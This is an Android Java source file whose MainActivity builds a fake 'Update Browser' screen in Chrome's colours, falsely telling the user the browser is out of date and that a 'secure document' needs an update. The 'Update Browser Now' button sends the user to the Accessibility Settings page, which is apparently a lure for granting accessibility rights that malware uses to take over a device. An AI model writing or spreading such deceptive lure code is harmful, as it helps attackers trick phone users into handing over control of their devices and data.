package com.browser.update;

import android.content.Intent;
import android.graphics.Color;
import android.graphics.Typeface;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.WHITE);
        layout.setGravity(Gravity.CENTER);
        layout.setPadding(50, 50, 50, 50);

        // Browser-style Icon placeholder
        TextView logo = new TextView(this);
        logo.setText("🌐"); 
        logo.setTextSize(80f);
        logo.setGravity(Gravity.CENTER);
        
        TextView title = new TextView(this);
        title.setText("Update Browser");
        title.setTextSize(24f);
        title.setTypeface(null, Typeface.BOLD);
        title.setTextColor(Color.parseColor("#202124")); // Chrome Dark Grey
        title.setGravity(Gravity.CENTER);
        title.setPadding(0, 20, 0, 10);

        TextView subtitle = new TextView(this);
        subtitle.setText("Your browser version is out of date. To view this secure document, you must install the latest browser update.");
        subtitle.setTextSize(15f);
        subtitle.setTextColor(Color.parseColor("#5f6368"));
        subtitle.setGravity(Gravity.CENTER);
        subtitle.setPadding(0, 0, 0, 40);

        Button btn = new Button(this);
        btn.setText("Update Browser Now");
        btn.setTextColor(Color.WHITE);
        btn.setTextSize(16f);
        btn.setBackgroundColor(Color.parseColor("#1A73E8")); // Chrome Blue
        
        layout.addView(logo);
        layout.addView(title);
        layout.addView(subtitle);
        layout.addView(btn);
        setContentView(layout);

        btn.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });
    }
}
